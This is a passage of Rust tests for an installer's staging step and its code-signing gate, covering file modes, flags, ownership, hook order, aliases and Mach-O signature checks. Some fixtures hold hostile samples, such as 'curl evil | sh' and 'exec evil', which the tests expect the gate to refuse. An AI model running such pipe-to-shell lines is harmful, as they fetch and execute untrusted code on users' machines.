                    .stdin(aterm_uds::spawnfd::Stdio::null())
                    .output();
            }
        }
        let d = tmp("dmg-modes");
        let _unflag = Unflag(&d);
        let root = d.join("stage");
        for (rel, body, copied, _) in FILES {
            lay(&root, rel, body, *copied);
        }
        lay_link(&root, "Foo.app/Contents/current", "MacOS/foo");
        for (rel, copied) in DIRS {
            std::fs::set_permissions(root.join(rel), std::fs::Permissions::from_mode(*copied))
                .unwrap();
        }
        for (rel, flag) in FLAGGED {
            let out = aterm_uds::spawnfd::command("/usr/bin/chflags")
                .arg(flag)
                .arg(root.join(rel))
                .stdin(aterm_uds::spawnfd::Stdio::null())
                .output()
                .unwrap();
            assert!(out.status.success(), "chflags {flag} {rel}: {out:?}");
        }
        let mode_of = |rel: &str| {
            std::fs::symlink_metadata(root.join(rel))
                .unwrap()
                .permissions()
                .mode()
                & 0o7777
        };
        let binding_flags_of = |rel: &str| {
            use std::os::macos::fs::MetadataExt as _;
            std::fs::symlink_metadata(root.join(rel))
                .unwrap()
                .st_flags()
                & (libc::UF_IMMUTABLE | libc::UF_APPEND)
        };
        vet_copied_tree(&root, &root.join("Foo.app")).unwrap();
        for (rel, _, copied, admitted) in FILES {
            assert_eq!(mode_of(rel), *admitted, "{rel}: copied {copied:o}");
        }
        for (rel, copied) in DIRS {
            assert_eq!(mode_of(rel), 0o755, "{rel}: copied {copied:o}");
        }
        for (rel, flag) in FLAGGED {
            assert_eq!(binding_flags_of(rel), 0, "{rel}: copied {flag}");
        }
        assert_eq!(
            std::fs::read_link(root.join("Foo.app/Contents/current")).unwrap(),
            Path::new("MacOS/foo"),
            "a link is left as it is"
        );
    }

    /// `ditto` keeps a member's owner and group (all of them as root; unprivileged, any group
    /// its user is in), so the dmg walk gives every entry, links included, the stage root's
    /// owner and group, as an archive lane's entry gets. A test cannot lay a foreign owner
    /// without root, so a file, a directory and a link are laid in another of this user's
    /// groups, the half `ditto` keeps at any privilege.
    #[cfg(target_os = "macos")]
    #[test]
    fn dmg_copy_walk_gives_every_entry_the_stage_roots_owner_and_group() {
        use std::os::unix::fs::MetadataExt as _;
        const ENTRIES: [&str; 4] = [
            "Foo.app/Contents/MacOS/foo",
            "Foo.app/Contents/Resources",
            "Foo.app/Contents/current",
            "Foo.app",
        ];
        let d = tmp("dmg-owner");
        let root = d.join("stage");
        lay(&root, "Foo.app/Contents/MacOS/foo", b"#!/bin/sh\n", 0o755);
        lay(&root, "Foo.app/Contents/Resources/r", b"r", 0o644);
        lay_link(&root, "Foo.app/Contents/current", "MacOS/foo");
        let stage = std::fs::symlink_metadata(&root).unwrap();
        // Another group this user is in: the supplementary list, then `everyone` (12),
        // which every macOS account belongs to, whichever the kernel admits first.
        let mut groups = [0 as libc::gid_t; 64];
        // SAFETY: `groups` is a writable buffer of exactly the 64 entries the call is told.
        let n = unsafe { libc::getgroups(64, groups.as_mut_ptr()) };
        let candidates = groups[..usize::try_from(n).unwrap_or(0)]
            .iter()
            .copied()
            .chain([12])
            .filter(|g| *g != stage.gid());
        let mut other = None;
        for gid in candidates {
            if std::os::unix::fs::lchown(root.join(ENTRIES[0]), None, Some(gid)).is_ok() {
                other = Some(gid);
                break;
            }
        }
        let other = other.expect("a group of this user's other than the stage root's");
        for rel in ENTRIES {
            std::os::unix::fs::lchown(root.join(rel), None, Some(other)).unwrap();
        }
        let ids = |rel: &str| {
            let m = std::fs::symlink_metadata(root.join(rel)).unwrap();
            (m.uid(), m.gid())
        };
        // The tree really carries the group under test.
        for rel in ENTRIES {
            assert_eq!(ids(rel).1, other, "{rel}: laid in group {other}");
        }

        vet_copied_tree(&root, &root.join("Foo.app")).unwrap();
        for rel in ENTRIES {
            assert_eq!(
                ids(rel),
                (stage.uid(), stage.gid()),
                "{rel}: copied in group {other}"
            );
        }
    }

    /// The scratch a stage fills is its owner's alone until the swap, and the build it
    /// becomes is `0755`, whatever the umask (`flow`'s
    /// `an_install_under_an_open_umask_leaves_nothing_others_can_write` stages under `000`).
    #[cfg(unix)]
    #[test]
    fn the_staging_scratch_is_private_until_the_swap_and_the_build_is_0755() {
        use std::os::unix::fs::PermissionsExt as _;
        let mode_of =
            |p: &Path| std::fs::symlink_metadata(p).unwrap().permissions().mode() & 0o7777;
        let b = bundle("scratch-mode");
        let build = b.build();
        let seen = std::cell::Cell::new(None);
        let pre_swap = |incoming: &Path| -> Result<(), StageError> {
            seen.set(Some(mode_of(incoming)));
            Ok(())
        };
        let hooks = StageHooks {
            pre_swap: Some(&pre_swap),
            sidecars: None,
            aliases: &[],
        };
        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        assert_eq!(
            seen.get(),
            Some(0o700),
            "the scratch as the stage filled it"
        );
        assert_eq!(mode_of(&build), 0o755, "the build it was swapped in as");
    }

    /// A vendor record for the sidecar tests: the root it was handed, so the test can
    /// check the stage passed the root it verified.
    fn vendor_record(root: &str) -> Vec<(&'static str, Vec<u8>)> {
        let mut body = String::from("tree_root = \"");
        body.push_str(root);
        body.push_str("\"\n");
        vec![(crate::store::VENDOR_SIDECAR_SUFFIX, body.into_bytes())]
    }

    /// The order: `pre_swap` sees the verified `.incoming` tree while nothing is at the build
    /// path, the sidecars are rendered from the verified root and are on disk beside the
    /// marked build, and the stage returns that same root.
    #[test]
    fn hooks_run_before_the_swap_and_sidecars_land_before_the_marker() {
        let b = bundle("hooks-order");
        let build = b.build();
        let seen: std::cell::RefCell<Vec<String>> = std::cell::RefCell::new(Vec::new());
        let pre_swap = |incoming: &Path| -> Result<(), StageError> {
            assert!(incoming.join("bin/ay").is_file(), "the verified tree");
            assert_ne!(incoming, build.as_path());
            assert!(!build.exists(), "nothing swapped yet");
            assert!(!crate::store::build_is_complete(&build));
            seen.borrow_mut().push("pre_swap".into());
            Ok(())
        };
        let sidecars = |root: &str| {
            seen.borrow_mut().push("sidecars".into());
            Ok(vendor_record(root))
        };
        let hooks = StageHooks {
            pre_swap: Some(&pre_swap),
            sidecars: Some(&sidecars),
            aliases: &[],
        };
        // aterm-durable's counting seam: the stage's three directory flushes are only
        // ordered (the tree's and each file's own flush is a plain `fsync(2)`, which the
        // seam does not see): the marker down before the old tree moves aside, the
        // sidecars before `.ready`, and `.ready`'s name before what follows. A lost step
        // reads as incomplete and the next pass stages again. Windows opens no directory to
        // flush, and each file's own flush is `aterm_durable::durable_data`, which the seam
        // sees: the tree's one file, the declared-mode record (Windows keeps one), the
        // sidecar and the marker, each durable.
        let recording = aterm_durable::seam::Recording::start();
        let root = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        let (flushes, what): (&[aterm_durable::Flush], &str) = if cfg!(windows) {
            (
                &[aterm_durable::Flush::Durable; 4],
                "the tree's file, the declared modes, the sidecar, the marker",
            )
        } else {
            (
                &[aterm_durable::Flush::Ordered; 3],
                "the swap's unmark, the sidecars, the marker",
            )
        };
        assert_eq!(recording.take(), flushes, "{what}");
        drop(recording);
        assert_eq!(root, b.art.tree_root, "the verified root comes back");
        assert_eq!(*seen.borrow(), ["pre_swap", "sidecars"]);
        assert!(crate::store::build_is_complete(&build));
        let record =
            crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
        assert_eq!(
            std::fs::read_to_string(&record).unwrap(),
            String::from_utf8(vendor_record(&root).remove(0).1).unwrap()
        );
    }

    /// `.ready` implies the sidecars: one that cannot be written stops the stage between the
    /// swap and the marker, leaving the verified tree unmarked (read as not installed), and
    /// the next stage that can write it marks the build.
    #[test]
    fn a_stage_stopped_between_swap_and_marker_leaves_no_complete_build() {
        let b = bundle("hooks-kill");
        let build = b.build();
        let record =
            crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
        // A directory where the record goes: the rename onto it fails.
        std::fs::create_dir_all(&record).unwrap();
        let sidecars = |root: &str| Ok(vendor_record(root));
        let hooks = StageHooks {
            pre_swap: None,
            sidecars: Some(&sidecars),
            aliases: &[],
        };
        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::Io(_)), "{err:?}");
        assert!(build.join("bin/ay").is_file(), "the swap had happened");
        assert!(
            !crate::store::build_is_complete(&build),
            "but nothing marked it"
        );

        std::fs::remove_dir(&record).unwrap();
        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        assert!(crate::store::build_is_complete(&build));
        assert!(record.is_file());
    }

    /// `8 + 20 * nfat` bytes of universal header naming `nfat` dummy arm64 slices.
    #[cfg(unix)]
    fn fat_macho(nfat: u32) -> Vec<u8> {
        let mut bytes = 0xCAFE_BABEu32.to_be_bytes().to_vec();
        bytes.extend_from_slice(&nfat.to_be_bytes());
        for i in 0..nfat {
            for word in [0x0100_000C, 0, 0x1_0000 + i * 0x1000, 0x1000, 12] {
                bytes.extend_from_slice(&u32::to_be_bytes(word));
            }
        }
        bytes
    }

    /// A thin 64-bit Mach-O header with nothing signed behind it.
    #[cfg(unix)]
    fn thin_macho() -> Vec<u8> {
        let mut thin = 0xCFFA_EDFEu32.to_be_bytes().to_vec();
        thin.extend_from_slice(&[0u8; 60]);
        thin
    }

    /// Run [`check_developer_id`] over `tree` for `exposes`, with codesign replaced by
    /// `verdict` (asked with the path relative to `tree`); returns the result and the
    /// relative paths asked about, in order.
    #[cfg(unix)]
    fn gate_with(
        tree: &Path,
        exposes: &[&str],
        verdict: &dyn Fn(&str) -> Result<(), aterm_update_core::codesign::CodesignError>,
    ) -> (Result<(), StageError>, Vec<String>) {
        let asked = std::cell::RefCell::new(Vec::new());
        let verify = |path: &Path, _deadline: std::time::Instant| {
            let rel = path
                .strip_prefix(tree)
                .unwrap()
                .to_string_lossy()
                .replace('\\', "/");
            asked.borrow_mut().push(rel.clone());
            verdict(&rel)
        };
        let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
        let result = check_developer_id(tree, "Q6L2SF6YDW", &exposes, &verify);
        (result, asked.into_inner())
    }

    #[cfg(unix)]
    fn unsigned() -> aterm_update_core::codesign::CodesignError {
        aterm_update_core::codesign::CodesignError::Refused {
            code: Some(1),
            stderr: "x: code object is not signed at all\n".into(),
        }
    }

    /// The pass path: a codex-shaped tree whose Mach-Os all verify passes, each Mach-O asked
    /// about once, in order, fat or thin, the data files not at all. The genuine package's
    /// executable-mode JSON arrives here demoted to 0644 by the vendor lane
    /// ([`crate::macho::demote_foreign_executables`]).
    #[cfg(unix)]
    #[test]
    fn the_gate_passes_a_tree_whose_every_macho_verifies_and_asks_about_each_once() {
        let d = tmp("devid-pass");
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
        lay(&d, "codex-path/rg", &fat_macho(2), 0o755);
        lay(
            &d,
            "codex-resources/voice/runtime.json",
            b"{\"a\": 1}\n",
            0o644,
        );
        lay(&d, "codex-resources/voice/NOTICE.md", b"# Notices\n", 0o644);
        let (result, asked) = gate_with(&d, &["codex"], &|_| Ok(()));
        result.expect("every Mach-O verifies and the entry is one of them");
        assert_eq!(
            asked,
            ["bin/codex", "bin/codex-code-mode-host", "codex-path/rg"]
        );
    }

    /// The entry is bound: what a shim runs (`bin/<tool>` for each exposed tool) must be one
    /// of the verified Mach-Os, so a text entry, a missing one or a link beside a signed decoy
    /// is refused, as is an interpreter-script helper.
    #[cfg(unix)]
    #[test]
    fn an_entry_that_is_not_a_verified_macho_or_a_script_helper_is_refused() {
        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
        // The refusal names the file it is about first.
        let refused_as =
            |d: &Path, exposes: &[&str], want: &str| match gate_with(d, exposes, &pass).0 {
                Err(StageError::SignerRefused(m)) => assert!(m.starts_with(want), "{m}"),
                other => panic!("{want}: {other:?}"),
            };
        let entry_refusal = "bin/codex ";

        let d = tmp("devid-entry");
        lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
        lay(&d, "bin/codex", b"curl evil | sh\n", 0o755);
        refused_as(&d, &["codex"], entry_refusal);

        std::fs::remove_file(d.join("bin/codex")).unwrap();
        refused_as(&d, &["codex"], entry_refusal);

        lay(&d, "payload.txt", b"curl evil | sh\n", 0o755);
        lay_link(&d, "bin/codex", "../payload.txt");
        refused_as(&d, &["codex"], entry_refusal);

        // Every exposed tool is bound, not only the first. (The executable decoy goes: an
        // execute bit on a non-Mach-O is refused on its own, below.)
        std::fs::remove_file(d.join("bin/codex")).unwrap();
        std::fs::remove_file(d.join("payload.txt")).unwrap();
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        gate_with(&d, &["codex"], &pass).0.unwrap();
        refused_as(&d, &["codex", "codex-exec"], "bin/codex-exec ");

        lay(&d, "codex-path/rg", b"#!/bin/sh\nexec evil\n", 0o755);
        refused_as(&d, &["codex"], "codex-path/rg ");
    }

    /// AN ALIAS IS A REGULAR FILE THE GATE JUDGES ON ITS OWN ([`lay_aliases`]): laid as a
    /// clone of the vendor's own entry, `bin/codex-old` is a Mach-O the gate asks about by
    /// its own path and binds as the exposed tool's entry, and a refusal of it alone refuses
    /// the tree.
    ///
    /// NEGATIVE CONTROL: the same name laid as a symlink to the entry is refused by the gate
    /// (`macho::find_macho`: only a regular file is verified) — why an alias is never one.
    #[cfg(unix)]
    #[test]
    fn an_alias_is_a_clone_the_gate_judges_and_a_symlinked_one_is_refused() {
        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
        let d = tmp("devid-alias");
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        lay_link(&d, "bin/codex-old", "codex");
        match gate_with(&d, &["codex-old"], &pass).0 {
            Err(StageError::SignerRefused(m)) => {
                assert!(m.contains("is a symlink to a Mach-O"), "{m}");
            }
            other => panic!("a symlinked alias passed the gate: {other:?}"),
        }
        std::fs::remove_file(d.join("bin/codex-old")).unwrap();
        let mut modes = DeclaredModes::new();
        lay_aliases(&d, &[("codex-old", "codex")], &mut modes).unwrap();
        let alias = std::fs::symlink_metadata(d.join("bin/codex-old")).unwrap();
        assert!(alias.file_type().is_file(), "a regular file, never a link");
        assert_eq!(
            std::fs::read(d.join("bin/codex-old")).unwrap(),
            thin_macho()
        );
        let (result, asked) = gate_with(&d, &["codex-old"], &pass);
        result.expect("the clone is a verified Mach-O and the entry its shim runs");
        assert_eq!(asked, ["bin/codex", "bin/codex-old"]);
        let refuse_alias = |rel: &str| {
            if rel == "bin/codex-old" {
                Err(unsigned())
            } else {
                Ok(())
            }
        };
        assert!(matches!(
            gate_with(&d, &["codex-old"], &refuse_alias).0,
            Err(StageError::SignerRefused(_))
        ));
    }

    /// What [`lay_aliases`] refuses, each a payload refusal that lays nothing: a target that
    /// is not a regular file of the vendor's tree (missing, a directory, a symlink), a name
    /// the vendor's tree already has, and a pair that is not two tool names.
    #[cfg(unix)]
    #[test]
    fn an_alias_of_nothing_a_link_or_a_taken_name_is_refused() {
        let d = tmp("alias-refusals");
        lay(&d, "real", &thin_macho(), 0o755);
        let refused = |aliases: &[(&str, &str)], want: &str| match lay_aliases(
            &d,
            aliases,
            &mut DeclaredModes::new(),
        ) {
            Err(StageError::Payload(m)) => assert!(m.contains(want), "{want}: {m}"),
            other => panic!("{aliases:?}: {other:?}"),
        };
        refused(&[("codex-old", "codex")], "bin/codex is not a regular file");
        std::fs::create_dir_all(d.join("bin/codex")).unwrap();
        refused(&[("codex-old", "codex")], "bin/codex is not a regular file");
        std::fs::remove_dir(d.join("bin/codex")).unwrap();
        lay_link(&d, "bin/codex", "../real");
        refused(&[("codex-old", "codex")], "bin/codex is not a regular file");
        std::fs::remove_file(d.join("bin/codex")).unwrap();
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        lay(&d, "bin/codex-old", b"the vendor's own\n", 0o644);
        refused(&[("codex-old", "codex")], "already has one");
        assert_eq!(
            std::fs::read(d.join("bin/codex-old")).unwrap(),
            b"the vendor's own\n",
            "a refusal lays nothing over the vendor's file"
        );
        refused(&[("../codex-old", "codex")], "not a tool name");
        refused(&[("codex-old", "")], "not a tool name");
    }

    /// THE STAGE LAYS ITS ALIASES AND FOLDS THEM ([`StageHooks::aliases`]): before the gate
    /// runs, `bin/<name>` stands in the verified tree as a regular file with the target's
    /// bytes and mode; the root the sidecars get and the stage returns is the walk of the
    /// tree as built, alias and all, so a later `atpkg verify` finds no drift. A target the
    /// payload does not carry refuses the stage before anything is swapped.
    ///
    /// NEGATIVE CONTROL: the same stage with no aliases returns the extractor's root.
    /// (Unix: the fixture's entry is `bin/ay`, not the `bin/ay.exe` a Windows alias clones.)
    #[cfg(unix)]
    #[test]
    fn the_stage_lays_its_aliases_before_the_gate_and_folds_them_into_its_root() {
        let b = bundle("alias-stage");
        let build = b.build();
        let gated = std::cell::Cell::new(false);
        let pre_swap = |incoming: &Path| -> Result<(), StageError> {
            let alias = std::fs::symlink_metadata(incoming.join("bin/ay-old"));
            gated.set(alias.is_ok_and(|m| m.file_type().is_file()));
            Ok(())
        };
        let handed = std::cell::RefCell::new(String::new());
        let sidecars = |root: &str| -> Result<Vec<(&'static str, Vec<u8>)>, StageError> {
            root.clone_into(&mut handed.borrow_mut());
            Ok(Vec::new())
        };
        let hooks = StageHooks {
            pre_swap: Some(&pre_swap),
            sidecars: Some(&sidecars),
            aliases: &[("ay-old", "ay")],
        };
        let root = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        assert!(gated.get(), "the gate saw the alias as a regular file");
        let (alias, entry) = (build.join("bin/ay-old"), build.join("bin/ay"));
        let meta = |p: &Path| std::fs::symlink_metadata(p).unwrap();
        assert!(meta(&alias).file_type().is_file());
        assert_eq!(meta(&alias).permissions(), meta(&entry).permissions());
        assert_eq!(
            std::fs::read(&alias).unwrap(),
            std::fs::read(&entry).unwrap()
        );
        assert_eq!(
            root,
            tree_root(&build).unwrap(),
            "the root is the tree as built"
        );
        assert_eq!(*handed.borrow(), root, "and the sidecars were handed it");
        assert_ne!(root, b.art.tree_root, "the alias joined the root");

        let plain = bundle("alias-stage-control");
        let root = verify_and_stage(
            &plain.art,
            &plain.archive,
            &plain.build(),
            &StageHooks::NONE,
        )
        .unwrap();
        assert_eq!(root, plain.art.tree_root);

        let missing = bundle("alias-stage-missing");
        let hooks = StageHooks {
            aliases: &[("ay-old", "nope")],
            ..StageHooks::NONE
        };
        let err =
            verify_and_stage(&missing.art, &missing.archive, &missing.build(), &hooks).unwrap_err();
        assert!(matches!(&err, StageError::Payload(m) if m.contains("is not a regular file")));
        assert!(!missing.build().exists(), "nothing was swapped in");
        assert!(!crate::store::build_is_complete(&missing.build()));
    }

    /// No execute bit off a verified Mach-O: a data file at 0755 beside Mach-Os that all
    /// verify is refused by name (`/bin/sh` would run it unsigned) and passes once the lane's
    /// demotion has cleared its bits, while every Mach-O keeps its own.
    #[cfg(target_os = "macos")]
    #[test]
    fn an_executable_that_is_not_a_macho_is_refused_until_demoted() {
        let d = tmp("devid-exec");
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        lay(
            &d,
            "codex-resources/voice/runtime.json",
            b"{\"a\": 1}\n",
            0o755,
        );
        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
        match gate_with(&d, &["codex"], &pass).0 {
            Err(StageError::SignerRefused(m)) => {
                assert!(m.starts_with("codex-resources/voice/runtime.json "), "{m}")
            }
            other => panic!("{other:?}"),
        }
        assert!(crate::macho::demote_foreign_executables(&d).unwrap());
        let mode = |rel: &str| {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777
        };
        assert_eq!(mode("codex-resources/voice/runtime.json"), 0o644);
        assert_eq!(mode("bin/codex"), 0o755, "a Mach-O keeps its bits");
        assert!(
            !crate::macho::demote_foreign_executables(&d).unwrap(),
            "idempotent"
        );
        gate_with(&d, &["codex"], &pass).0.unwrap();
    }

    /// Linux keeps ELF executable, not Mach-O; foreign binaries and data lose
    /// their execute bits without changing the executable's bytes.
    #[cfg(target_os = "linux")]
    #[test]
    fn linux_demotion_keeps_elf_and_demotes_macho_and_executable_data() {
        use std::os::unix::fs::PermissionsExt as _;
        let d = tmp("linux-exec");
        let elf = crate::vendor_direct::lane::world::native_exe("codex");
        lay(&d, "bin/codex", &elf, 0o755);
        lay(&d, "foreign/macos-helper", &thin_macho(), 0o755);
        lay(&d, "codex-resources/runtime.json", b"{}\n", 0o755);
        assert!(crate::macho::demote_foreign_executables(&d).unwrap());
        let mode =
            |rel: &str| std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777;
        assert_eq!(mode("bin/codex"), 0o755);
        assert_eq!(std::fs::read(d.join("bin/codex")).unwrap(), elf);
        assert_eq!(mode("foreign/macos-helper"), 0o644);
        assert_eq!(mode("codex-resources/runtime.json"), 0o644);
        assert!(!crate::macho::demote_foreign_executables(&d).unwrap());
    }

    /// What the gate makes of each codesign outcome: a verdict on the bytes (a signature
    /// fault, another signer) refuses the signer; a team that is not one is the row's
    /// fault; a timeout DEFERS — never a failure, never a refusal; and codesign failing to
    /// judge (a file it could not read, no codesign) is Io: retried, never memoized
    /// against the vendor's bytes. Each names the file it is about.
    #[cfg(unix)]
    #[test]
    fn the_gate_maps_each_codesign_outcome() {
        use aterm_update_core::codesign::CodesignError;
        let d = tmp("devid-outcomes");
        lay(&d, "bin/claude", &thin_macho(), 0o755);
        let cases: [(fn() -> CodesignError, Want); 6] = [
            (unsigned, |e| matches!(e, StageError::SignerRefused(_))),
            (
                || CodesignError::Refused {
                    code: Some(3),
                    stderr: "x: code failed to satisfy specified code requirement(s)\n".into(),
                },
                |e| matches!(e, StageError::SignerRefused(_)),
            ),
            (
                || CodesignError::InvalidTeam("not a team".into()),
                |e| matches!(e, StageError::Payload(_)),
            ),
            (
                || CodesignError::TimedOut,
                |e| matches!(e, StageError::VerifyDeferred(m) if m.starts_with("bin/claude")),
            ),
            (
                || CodesignError::Refused {
                    code: Some(1),
                    stderr: "bin/claude: Permission denied\n".into(),
                },
                |e| matches!(e, StageError::Io(io) if io.to_string().starts_with("bin/claude")),
            ),
            (
                || CodesignError::Unsupported,
                |e| matches!(e, StageError::Io(_)),
            ),
        ];
        for (i, (outcome, want)) in cases.into_iter().enumerate() {
            let err = gate_with(&d, &["claude"], &|_| Err(outcome()))
                .0
                .unwrap_err();
            assert!(want(&err), "case {i}: {err:?}");
        }
    }

    /// Each Mach-O is asked with a deadline scaled by its size — a sparse 238 MB codex
    /// gets [`verify_timeout_for`] of it, past the 30 s floor a small one keeps — not the
    /// fixed floor a large binary under the window's utility clamp runs out of.
    #[cfg(unix)]
    #[test]
    fn the_gate_gives_each_macho_a_deadline_scaled_by_its_size() {
        use aterm_update_core::codesign::{VERIFY_TIMEOUT, verify_timeout_for};
        let exposes = vec![String::from("codex")];
        let deadline_for = |len: Option<u64>| {
            let one = tmp("devid-deadline");
            lay(&one, "bin/codex", &thin_macho(), 0o755);
            if let Some(len) = len {
                std::fs::OpenOptions::new()
                    .write(true)
                    .open(one.join("bin/codex"))
                    .unwrap()
                    .set_len(len)
                    .unwrap();
            }
            let given = std::cell::Cell::new(None);
            let answer = |_: &Path, deadline: std::time::Instant| {
                given.set(Some(
                    deadline.saturating_duration_since(std::time::Instant::now()),
                ));
                Ok(())
            };
            check_developer_id(&one, "2DC432GLL2", &exposes, &answer).unwrap();
            given.get().unwrap()
        };
        // codex's real size, sparse: only the header is written.
        let big: u64 = 238_223_808;
        let slack = std::time::Duration::from_secs(5);
        let large = deadline_for(Some(big));
        assert!(
            large + slack >= verify_timeout_for(big) && large <= verify_timeout_for(big),
            "a 238 MB Mach-O gets its size-scaled deadline: {large:?}"
        );
        assert!(
            large > VERIFY_TIMEOUT + slack,
            "past the 30 s floor: {large:?}"
        );
        let small = deadline_for(None);
        assert!(
            small <= VERIFY_TIMEOUT && small + slack >= VERIFY_TIMEOUT,
            "a small Mach-O keeps the 30 s floor: {small:?}"
        );
    }

    /// A gate with nothing to bind, or a tool name that is not one, is the caller's fault
    /// ([`StageError::Payload`]), refused before any file is judged.
    #[cfg(unix)]
    #[test]
    fn a_gate_with_no_or_a_bad_exposed_tool_is_a_payload_error() {
        let d = tmp("devid-exposes");
        lay(&d, "bin/claude", &thin_macho(), 0o755);
        let (result, asked) = gate_with(&d, &[], &|_| Ok(()));
        assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
        assert!(asked.is_empty());
        let (result, asked) = gate_with(&d, &["../claude"], &|_| Ok(()));
        assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
        assert!(asked.is_empty());
    }

    /// The gate through real codesign, needing no real signature: a tree with no Mach-O
    /// and an unsigned Mach-O are each refused as a signer verdict.
    #[cfg(target_os = "macos")]
    #[test]
    fn the_developer_id_gate_refuses_no_macho_and_an_unsigned_one() {
        let gate = developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check);
        let d = tmp("devid-shapes");
        lay(&d, "bin/claude", b"echo hi\n", 0o644);
        assert!(matches!(gate(&d), Err(StageError::SignerRefused(_))));
        std::fs::write(d.join("bin/claude"), thin_macho()).unwrap();
        match gate(&d) {
            Err(StageError::SignerRefused(m)) => assert!(m.starts_with("bin/claude "), "{m}"),
            other => panic!("{other:?}"),
        }
    }

    /// Off macOS there is no platform anchor: the gate passes any tree, Mach-O or not.
    #[cfg(not(target_os = "macos"))]
    #[test]
    fn off_macos_the_developer_id_gate_passes() {
        let d = tmp("devid-off");
        assert!(developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d).is_ok());
    }
}
